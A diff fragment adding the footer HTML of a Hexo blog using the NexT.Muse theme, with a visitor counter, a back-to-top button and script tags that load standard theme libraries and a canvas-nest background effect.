+  <span class="author" itemprop="copyrightHolder">cws6</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!-- 
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v6.6.0</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
